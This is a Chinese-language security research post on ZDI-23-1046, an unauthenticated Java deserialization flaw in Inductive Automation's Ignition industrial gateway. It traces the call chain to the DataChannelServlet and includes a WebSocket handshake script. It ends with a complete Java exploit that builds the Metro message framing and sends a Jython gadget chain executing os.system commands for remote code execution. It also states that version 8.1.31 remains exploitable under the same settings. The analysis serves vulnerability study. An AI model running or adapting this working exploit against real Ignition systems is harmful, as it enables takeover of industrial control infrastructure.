根据公告来看 <https://www.zerodayinitiative.com/advisories/ZDI-23-1046/>
未授权，反序列化点在JavaSerializationCodec，漏洞比较特殊，可能是设计问题，找找吧。

# 安装

ignition-8.1.30-windows-64-installer.exe 一直下一步就行了

# 环境配置

![](./img/6467730576149558271.png)

进程树里典型的wrapper程序

![](./img/1999203627025898643.png)

服务里指定了配置文件

    
    
    "C:\Program Files\Inductive Automation\Ignition\IgnitionGateway.exe" -s "C:\Program Files\Inductive Automation\Ignition\data\ignition.conf"

![](./img/959844375899988063.png)

取消注释开启remote jvm debug，classpath在

  1. lib/wrapper.jar
  2. lib/core/common/*
  3. lib/core/gateway/*

所以把这三个目录里的jar拷贝出来创建项目加到lib里远程调试打断点。

# 分析

我习惯先通过sink点的调用关系反推找到source点，然后再正向构造payload。

JavaSerializationCodec实现MessageCodec接口

![](./img/1149834837877924044.png)

`com.inductiveautomation.metro.impl.codecs.JavaSerializationCodec`

![](./img/5417170766377553083.png)

decode中用了 ObjectInputStream.readObject 朴实无华，找调用链就行了，通过jadx找到
`com.inductiveautomation.metro.impl.transport.ServerMessage#decodePayload`

![](./img/7609671110242248111.png)

继续向上回溯到
`com.inductiveautomation.metro.impl.ConnectionWatcher#handleConnectionMessage`

![](./img/163248063208620953.png)

继续 `com.inductiveautomation.metro.impl.ConnectionWatcher#handle`

![](./img/7076344797983356594.png)

再向上回溯

![](./img/8168855985798479644.png)

到 forward 再到 onDataReceived

![](./img/3420787053760642148.png)

onDataReceived 向上到
`com.inductiveautomation.metro.impl.protocol.websocket.servlet.DataChannelServlet#doPost`

DataChannelServlet继承自HttpServlet 自身字段定义了SERVLET_NAME和url

![](./img/2548382840365213334.png)

猜测是动态创建的路由，于是寻找对SERVLET_NAME字段的引用，在
`com.inductiveautomation.metro.impl.protocol.websocket.WebSocketFactory#getRequiredServletsExternal`中找到了

![](./img/8085687362823180345.png)

回溯
`com.inductiveautomation.ignition.gateway.gan.WSChannelManager#getServletsToInstall`
->
`com.inductiveautomation.ignition.gateway.gan.WSChannelManager#restartChannels(java.util.Optional<com.inductiveautomation.metro.api.ServerId>)`

![](./img/8287006307295194656.png)

可以路由地址为`/system/ws-datachannel-servlet`，ok，到这就找到了完整的调用路径，接下来一步步构造即可。

# 构造请求包

请求包并不好构造，涉及到很多坑，我接下来慢慢讲。

请求 `/system/ws-datachannel-servlet` 返回403

![](./img/2236052024235128773.png)

调试发现在`com.inductiveautomation.metro.impl.protocol.websocket.servlet.DataChannelServlet#service`

![](./img/6576381542799726759.png)

会判断是否是ssl请求，并且和设定的端口进行比对，而`boolean useSsl =
webSocketFactory.isUseSsl()`的值取决于管理员设置，默认为true，在后台这个地方可以设置。

![](./img/4358520980033150395.png)

取消勾选此选项即可就不会返回403了，这里思考一个问题，http不是默认配置，那https呢？尝试访问8060端口，返回`ERR_BAD_SSL_CLIENT_AUTH_CERT`，应该是mtls双向认证，和mr_me沟通了一下，他说需要配置一些ssl的东西，我配置了半天，没弄明白，这个得等mr_me的文章了。

但是再思考一下，如果这个漏洞需要手动配置ssl，还算是默认配置吗？想了想这个默认配置的定义，然后觉得无所吊谓，能打就行，能学到东西就行，瞬间释然了。扯远了，接着说漏洞。

![](./img/7310998937118364761.png)

发post包我们需要进入2标，需要满足1标不为空的前提

![](./img/6371217537315084430.png)

1标的值取决于this.incoming，这个时候我通过查找putIncomingConnection的调用关系，将目光锁定在另一个servlet
`com.inductiveautomation.metro.impl.protocol.websocket.servlet.WebSocketControlServlet`上，猜测是用这个来注册websocket链接就可以了。

WebSocketControlServlet继承自JettyWebSocketServlet，websocket会进行协议升级

![](./img/1967147211567727676.png)

org.eclipse.jetty.websocket.core.server.internal.AbstractHandshaker#upgradeRequest

![](./img/3038164560020013917.png)

在协商时

org.eclipse.jetty.websocket.core.server.internal.CreatorNegotiator#negotiate

![](./img/5192608746653496701.png)

`this.creator.createWebSocket(upgradeRequest, upgradeResponse)` 创建了websocket

`com.inductiveautomation.metro.impl.protocol.websocket.WebSocketFactory#createWebSocket`
会校验参数， **并且会校验ssl信息和ip地址**

    
    
    public Object createWebSocket(JettyServerUpgradeRequest req, JettyServerUpgradeResponse resp) {
        String methodName = "createWebSocket";
        String remoteSystemName = null;
        String remoteUuid = "";
        boolean requestSecure = req.isSecure();
        if (this.useSsl && !requestSecure) {
            this.logger.debug("createWebSocket", "Incoming insecure websocket upgrade request is not allowed (SSL / TLS is required in settings)");
            return this.sendError(resp, 403, "Bad scheme");
        } else {
            HttpServletRequest httpServletRequest = req.getHttpServletRequest();
            int requestPort = httpServletRequest.getLocalPort();
            String protocol;
            int localPort;
            if (requestSecure) {
                protocol = "https";
                localPort = this.localHttpsPort;
            } else {
                protocol = "http";
                localPort = this.localHttpPort;
            }
    
            if (requestPort != localPort) {
                this.logger.debug("createWebSocket", String.format("Incoming %s request port %d is not allowed (expected %d)", protocol, requestPort, localPort));
                return this.sendError(resp, 403, "Bad port");
            } else {
                Map<String, List<String>> params = req.getParameterMap();
                List<String> nameParts = (List)params.get("name");
                if (nameParts.isEmpty()) {
                    this.logger.error("createWebSocket", String.format("Request parameter '%s' was not sent during web socket connect request", "name"), (Throwable)null);
                } else {
                    remoteSystemName = (String)nameParts.get(0);
                }
    
                List<String> urlParts = (List)params.get("url");
                String remoteAddr;
                if (urlParts.isEmpty()) {
                    remoteAddr = String.format("Request parameter '%s' was not sent during web socket connect request", "url");
                    this.logger.error("createWebSocket", remoteAddr, (Throwable)null);
                    return this.sendError(resp, 400, remoteAddr);
                } else {
                    String remoteSystemUrlStr = (String)urlParts.get(0);
                    remoteAddr = httpServletRequest.getRemoteAddr();
                    if (!remoteSystemUrlStr.contains(remoteAddr)) {
                        String[] split = remoteSystemUrlStr.split(":");
                        remoteSystemUrlStr = split[0] + "://" + remoteAddr + ":" + split[2];
                    }
    
                    URL remoteSystemUrl;
                    try {
                        remoteSystemUrl = new URL(remoteSystemUrlStr);
                    } catch (MalformedURLException var22) {
                        this.logger.error("createWebSocket", String.format("The URL request parameter '%s' is not a valid URL", remoteSystemUrlStr), (Throwable)null);
                        return this.sendError(resp, 400, "The URL request parameter is not a valid URL");
                    }
    
                    List<String> uuidParts = (List)params.get("uuid");
                    if (uuidParts != null && !uuidParts.isEmpty()) {
                        remoteUuid = (String)uuidParts.get(0);
                    }
    
                    this.logger.debug("createWebSocket", String.format("Incoming connection from: '%s', remoteSystemName='%s', uuid='%s'", remoteSystemUrl, remoteSystemName, remoteUuid));
                    RemoteSystemId remoteSystemId = StringUtils.isBlank(remoteUuid) ? new RemoteSystemIdURL(remoteSystemUrlStr, remoteSystemName) : new RemoteSystemIdUUID(remoteUuid, remoteSystemName);
                    if (this.connectionSecurityPlugin != null) {
                        String securityMsg = this.connectionSecurityPlugin.checkConnection((RemoteSystemId)remoteSystemId, String.valueOf(remoteSystemUrl));
                        if (securityMsg.startsWith("SecurityFail:")) {
                            this.logger.debug("onConnect", securityMsg);
    
                            try {
                                resp.sendForbidden("Approval required");
                            } catch (IOException var21) {
                            }
    
                            return null;
                        }
                    }
    
                    MetroWebSocket newReceiver = new MetroWebSocket(this, (RemoteSystemId)remoteSystemId, remoteSystemUrl, Direction.Incoming, requestSecure);
                    RemoteSystemIdUUID localId = new RemoteSystemIdUUID(this.getLocalSystemUUID(), this.getLocalSystemId());
                    resp.setHeader("remoteSystemId", localId.toString());
                    return newReceiver;
                }
            }
        }
    }
    

在`this.connectionSecurityPlugin.checkConnection((RemoteSystemId)remoteSystemId,
String.valueOf(remoteSystemUrl))` 会判断当前的ip传入策略

![](./img/5373386435077887960.png)

同样这里需要改为Unrestricted，或者加上白名单IP才行

![](./img/1953594450763225411.png)

接着构造websocket向`172.16.1.152:8088/system/ws-control-servlet`发包，我这里用本地js发

    
    
    <script>
        let socket = new WebSocket("ws://172.16.1.152:8088/system/ws-control-servlet?name=q&uuid=6a7e39e1-1ca4-405f-bfb3-6d971d6e7211&url=http://172.16.1.152:8088/system");
        socket.onopen = function (e) {
            alert("[open] Connection established");
            socket.send("My name is John");
        };
    
        socket.onmessage = function (event) {
            alert(`[message] Data received from server: ${event.data}`);
        };
    
        socket.onclose = function (event) {
            if (event.wasClean) {
                alert(`[close] Connection closed cleanly, code=${event.code} reason=${event.reason}`);
            } else {
                // 例如服务器进程被杀死或网络中断
                // 在这种情况下，event.code 通常为 1006
                alert('[close] Connection died');
            }
        };
    
        socket.onerror = function (error) {
            alert(`[error] ${error.message}`);
        };
    </script>
    

成功通过onmessage拿到data `remoteConnectionId=ignition-win-a4201ucqfrn`

![](./img/8153234015656837970.png)

此时在
com.inductiveautomation.metro.impl.protocol.websocket.servlet.DataChannelServlet#doPost
中就可以满足非空条件了。

![](./img/4481145679978348165.png)

然后正常进入onDataReceived -> ... -> ... -> readObject

放出堆栈供大家借鉴

    
    
    readObject:-1, ObjectInputStream (java.io)
    decode:65, JavaSerializationCodec (com.inductiveautomation.metro.impl.codecs)
    decodePayload:151, ServerMessage (com.inductiveautomation.metro.impl.transport)
    handleConnectionMessage:393, ConnectionWatcher (com.inductiveautomation.metro.impl)
    handle:442, ConnectionWatcher (com.inductiveautomation.metro.impl)
    handle:45, ConnectionWatcher (com.inductiveautomation.metro.impl)
    forward:1420, WebSocketConnection (com.inductiveautomation.metro.impl.protocol.websocket)
    onDataReceived:1313, WebSocketConnection (com.inductiveautomation.metro.impl.protocol.websocket)
    doPost:262, DataChannelServlet (com.inductiveautomation.metro.impl.protocol.websocket.servlet)
    service:523, HttpServlet (javax.servlet.http)
    service:188, DataChannelServlet (com.inductiveautomation.metro.impl.protocol.websocket.servlet)
    service:590, HttpServlet (javax.servlet.http)
    service:86, MapServlet (com.inductiveautomation.ignition.gateway.bootstrap)

# gadget

有readObject并不意味着rce，我们需要gadget，看了看lib好像有jython，想着去ysoserial找一找，然后发现了mr_me的现成的
<https://github.com/frohoff/ysoserial/pull/200/> 哈哈哈，想睡觉就来枕头啊。

![](./img/5882555424936464147.png)

# exp

整理一下攻击流程，首先通过websocket获取remoteConnectionId，然后构造java序列化数据包发送即可rce。

这里给出java11用HttpClient发送恶意请求包的exp

    
    
    package org.example;
    
    import org.python.core.PyMethod;
    import org.python.core.PyObject;
    import org.python.core.PyString;
    import org.python.core.PyStringMap;
    
    import java.io.ByteArrayOutputStream;
    import java.io.DataOutputStream;
    import java.io.IOException;
    import java.io.ObjectOutputStream;
    import java.lang.reflect.Constructor;
    import java.lang.reflect.Field;
    import java.lang.reflect.Proxy;
    import java.net.URI;
    import java.net.http.HttpClient;
    import java.net.http.HttpRequest;
    import java.net.http.HttpResponse;
    import java.time.Duration;
    import java.util.Comparator;
    import java.util.HashMap;
    import java.util.List;
    import java.util.PriorityQueue;
    
    public class Main {
        public static void main(String[] args) throws Exception {
            String url = "http://172.16.1.152:8088";
            System.setProperty("jdk.httpclient.allowRestrictedHeaders", "Connection,Upgrade");
            HttpClient httpClient = HttpClient.newBuilder().connectTimeout(Duration.ofSeconds(30))
    //                .proxy(ProxySelector.of(InetSocketAddress.createUnresolved("127.0.0.1", 8080)))
                    .build();
            String name = "qq";
            String uuid = "1a7e39e1-1ca4-405f-bfb3-6d971d6e7211";
            HttpRequest request = HttpRequest.newBuilder()
                    .uri(URI.create(String.format("%s/system/ws-control-servlet?name=%s&uuid=%s&url=http://localhost:8088/system", url, name, uuid)))
                    .GET()
                    .header("Connection", "Upgrade").header("Sec-WebSocket-Version", "13").header("Sec-WebSocket-Key", "cJA5QIfEfnrZr7rrJ+3urg==").header("Upgrade", "websocket")
                    .header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36")
                    .build();
            HttpResponse<String> response = httpClient.send(request, HttpResponse.BodyHandlers.ofString());
            List<String> headerForRemoteSystemID = response.headers().map().get("remoteSystemId");
            if (headerForRemoteSystemID.size() < 1) {
                System.out.println("[X] can't get remoteSystemId");
            }
            String remoteSystemId = headerForRemoteSystemID.get(0).split("\\|")[0];
            System.out.println("remoteSystemId=" + remoteSystemId);
    
            ByteArrayOutputStream stream = new ByteArrayOutputStream();
            DataOutputStream dataOutputStream = new DataOutputStream(stream);
            dataOutputStream.writeInt(18753);   // magicBytes
            dataOutputStream.writeInt(1);       // protocolVersion
    
            // messageId
            dataOutputStream.writeShort(1);
            //opCode
            dataOutputStream.writeInt(1);
            //subCode
            dataOutputStream.writeInt(1);
            //flags
            dataOutputStream.writeByte(1);
    
            //senderId
            dataOutputStream.writeShort(name.length());
            // 这里和websocket中的name参数保持一致
            dataOutputStream.writeChars(name);
            //targetAddress
            dataOutputStream.writeShort(remoteSystemId.length());
            dataOutputStream.writeChars(remoteSystemId);
    
            //senderUrl
            dataOutputStream.writeShort(1);
            dataOutputStream.writeChar(47);
    
            // readObject for ServerMessage
            dataOutputStream.writeInt(1);
    
            Class<?> aClass = Class.forName("com.inductiveautomation.metro.impl.transport.ServerMessage$ServerMessageHeader");
            Constructor<?> declaredConstructor = aClass.getDeclaredConstructors()[1];
            declaredConstructor.setAccessible(true);
            Object o = declaredConstructor.newInstance("_conn_svr", "_js_");
    
            Field headersValues = o.getClass().getDeclaredField("headersValues");
            headersValues.setAccessible(true);
            HashMap map = (HashMap) headersValues.get(o);
            map.put("_source_", remoteSystemId);
            map.put("replyrequested", "true");
    
            byte[] bs = serialize(o);
    
            dataOutputStream.writeInt(bs.length);
            dataOutputStream.write(bs);
    
            // evil payload
            byte[] serialize = serialize(getObj("calc"));
            dataOutputStream.write(serialize);
    
    
            HttpRequest request1 = HttpRequest.newBuilder(URI.create(url + "/system/ws-datachannel-servlet"))
                    .POST(HttpRequest.BodyPublishers.ofByteArray(stream.toByteArray()))
                    .header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36")
                    .build();
            HttpResponse<String> httpResponse = httpClient.send(request1, HttpResponse.BodyHandlers.ofString());
            System.out.println(httpResponse.body());
    
        }
    
        public static byte[] serialize(Object o) throws IOException {
            ByteArrayOutputStream stream = new ByteArrayOutputStream();
            ObjectOutputStream objectOutputStream = new ObjectOutputStream(stream);
            objectOutputStream.writeObject(o);
            objectOutputStream.flush();
            objectOutputStream.flush();
            stream.flush();
    
            return stream.toByteArray();
        }
    
        public static Object getObj(String cmd) throws Exception {
            Class<?> BuiltinFunctionsclazz = Class.forName("org.python.core.BuiltinFunctions");
            Constructor<?> c = BuiltinFunctionsclazz.getDeclaredConstructors()[0];
            c.setAccessible(true);
            Object builtin = c.newInstance("rce", 18, 1);
            PyMethod handler = new PyMethod((PyObject) builtin, null, new PyString().getType());
            Comparator comparator = (Comparator) Proxy.newProxyInstance(Comparator.class.getClassLoader(), new Class<?>[]{Comparator.class}, handler);
            PriorityQueue<Object> priorityQueue = new PriorityQueue<Object>(2, comparator);
            HashMap<Object, PyObject> myargs = new HashMap<>();
            myargs.put("cmd", new PyString(cmd));
            PyStringMap locals = new PyStringMap(myargs);
            Object[] queue = new Object[]{new PyString("__import__('os').system(cmd)"), // attack
                    locals,                                       // context
            };
            Field field = priorityQueue.getClass().getDeclaredField("queue");
            field.setAccessible(true);
            field.set(priorityQueue, queue);
    
            Field declaredField = priorityQueue.getClass().getDeclaredField("size");
            declaredField.setAccessible(true);
            declaredField.set(priorityQueue, 2);
            return priorityQueue;
        }
    }
    

# 新版本

从官网下的最新版 ignition-8.1.31-windows-64-installer
仍未修复，不过还是需要关闭ssl，并且配置IP策略为Unrestricted才行。

# 总结

花了两天时间才看完这个洞，其中碰到了很多问题，写文章的时候一时半会想不起来了，可能会有疏漏。

